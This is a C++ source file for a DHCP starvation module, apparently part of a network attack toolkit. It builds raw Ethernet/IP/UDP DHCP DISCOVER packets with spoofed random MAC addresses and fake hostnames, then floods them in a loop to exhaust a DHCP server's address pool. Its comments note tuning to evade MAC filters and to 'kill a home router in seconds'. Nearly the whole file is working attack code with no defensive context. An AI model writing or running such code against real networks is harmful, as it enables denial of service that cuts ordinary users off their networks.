#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <random>

#include "../headers/dhcp.h"

DHCP::DHCP(Mode mode) : current_mode(mode), stop_flag(false) {}

DHCP::~DHCP() {
    stop();
}

std::string DHCP::get_name() {
    if (current_mode == STARVATION) return "DHCP Starvation";
    return "DHCP Attack";
}

void DHCP::stop() {
    stop_flag = true;
    for (auto& t : attack_threads) {
        if (t.joinable()) t.join();
    }
    attack_threads.clear();
}

void DHCP::run(Session* session) {
    if (session->interface.empty()) {
        std::cerr << C_YELLOW << "DHCP Attack requires an Interface." << C_RESET << std::endl;
        return;
    }

    stop_flag = false;
    
    if (current_mode == STARVATION) {
        //std::cout << C_GREEN << "[*] Starting DHCP Starvation on " << session->interface << "..." << C_RESET << std::endl;
        // Launch multiple threads to fill the pool faster
        attack_threads.emplace_back(&DHCP::starvation_loop, this, session->interface);
    }
}

void DHCP::generate_random_mac(uint8_t* mac) {
    // Keep the OUI (first 3 bytes) consistent-ish or random
    // Using a locally administered unicast range usually avoids filters
    mac[0] = 0x02; 
    for(int i = 1; i < 6; ++i) mac[i] = rand() % 255;
}

void DHCP::starvation_loop(std::string interface) {
    // 1. Create Raw Socket
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    // 2. Get Interface Index
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("Interface index failed");
        close(sock);
        return;
    }
    int ifindex = ifr.ifr_ifindex;

    // 3. Flood Loop
    uint8_t random_mac[6];
    
    while (!stop_flag) {
        generate_random_mac(random_mac);
        send_dhcp_discover(sock, ifindex, random_mac);
        
        // Speed control: Too fast might crash the socket buffer, 
        // 10ms is usually enough to kill a home router in seconds.
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    close(sock);
}

unsigned short calculate_checksum(unsigned short* b, int len) {
    unsigned short total = 0;
    unsigned short prev = 0;
    
    // Sum all 16-bit words
    for(int i = 0; i < len / 2; i++){
        prev = total;
        total += b[i];
        if (total < prev) total++; // Handle overflow
    }
    
    // Handle the final byte if length is odd
    if (len % 2 == 1) {
        prev = total;
        total += ((unsigned char*)b)[len-1] << 8; // Pad with 0
        if (total < prev) total++;
    }
    
    return ~total; // Return One's Complement
}

void DHCP::send_dhcp_discover(int sock, int ifindex, const uint8_t* src_mac) {
    // Buffer size increased to ensure we have room for padding
    uint8_t buffer[1500];
    memset(buffer, 0, sizeof(buffer));

    // --- 1. ETHERNET HEADER ---
    struct ethhdr* eth = (struct ethhdr*)buffer;
    memset(eth->h_dest, 0xff, 6); // Broadcast
    memcpy(eth->h_source, src_mac, 6);
    eth->h_proto = htons(ETH_P_IP);

    // --- 2. IP HEADER ---
    struct ip* ip = (struct ip*)(buffer + sizeof(struct ethhdr));
    ip->ip_hl = 5;
    ip->ip_v = 4;
    ip->ip_tos = 0;
    ip->ip_id = htons(rand() % 65535);
    ip->ip_off = 0;
    ip->ip_ttl = 64;
    ip->ip_p = IPPROTO_UDP;
    ip->ip_src.s_addr = 0; 
    ip->ip_dst.s_addr = 0xffffffff; 

    // --- 3. UDP HEADER ---
    struct udphdr* udp = (struct udphdr*)(buffer + sizeof(struct ethhdr) + sizeof(struct ip));
    udp->source = htons(68);
    udp->dest = htons(67);
    udp->check = 0; // Optional for IPv4, safe to leave 0

    // --- 4. DHCP HEADER ---
    struct dhcp_header* dhcp = (struct dhcp_header*)(buffer + sizeof(struct ethhdr) + sizeof(struct ip) + sizeof(struct udphdr));
    dhcp->op = 1;     // BOOTREQUEST
    dhcp->htype = 1;  // Ethernet
    dhcp->hlen = 6;   
    dhcp->hops = 0;
    dhcp->xid = htonl(rand()); 
    dhcp->secs = 0;
    dhcp->flags = htons(0x8000); // Broadcast
    dhcp->ciaddr = 0;
    dhcp->yiaddr = 0;
    dhcp->siaddr = 0;
    dhcp->giaddr = 0;
    dhcp->cookie = htonl(0x63825363); 
    memcpy(dhcp->chaddr, src_mac, 6); 

    // --- 5. OPTIONS ---
    uint8_t* options = (uint8_t*)(dhcp + 1);
    int offset = 0;

    // Option 53: Message Type = DISCOVER
    options[offset++] = 53; options[offset++] = 1; options[offset++] = 1;

    // Option 12: Hostname
    std::string fake_name = "android-" + std::to_string(rand() % 9999);
    options[offset++] = 12; 
    options[offset++] = fake_name.length();
    memcpy(options + offset, fake_name.c_str(), fake_name.length());
    offset += fake_name.length();

    // Option 55: Parameter Request List
    uint8_t params[] = {1, 3, 6, 15, 28}; 
    options[offset++] = 55;
    options[offset++] = sizeof(params);
    memcpy(options + offset, params, sizeof(params));
    offset += sizeof(params);

    // Option 255: End of Options
    options[offset++] = 255;

    // --- 6. CRITICAL: PADDING TO 300 BYTES ---
    // RFC 2131/2132 implies BOOTP/DHCP packets should be >= 300 bytes.
    // VMware and some Cisco routers DROP packets smaller than this.
    int current_dhcp_size = sizeof(struct dhcp_header) + offset;
    while (current_dhcp_size < 300) {
        options[offset++] = 0; // Option 0 (Pad)
        current_dhcp_size++;
    }

    // --- 7. LENGTHS & CHECKSUM ---
    int udp_len = sizeof(struct udphdr) + current_dhcp_size;
    int ip_len = sizeof(struct ip) + udp_len;
    int total_len = sizeof(struct ethhdr) + ip_len;

    udp->len = htons(udp_len);
    ip->ip_len = htons(ip_len);
    
    // Calculate IP Checksum (Kernel doesn't do it automatically for SOCK_RAW unless configured)
    ip->ip_sum = 0;
    ip->ip_sum = calculate_checksum((unsigned short*)ip, sizeof(struct ip));

    // --- 8. SEND ---
    struct sockaddr_ll device;
    memset(&device, 0, sizeof(device));
    device.sll_family = AF_PACKET;
    device.sll_ifindex = ifindex;
    device.sll_halen = ETH_ALEN;
    memset(device.sll_addr, 0xff, 6);

    if (sendto(sock, buffer, total_len, 0, (struct sockaddr*)&device, sizeof(device)) < 0) {
        // Ignore errors
    }
}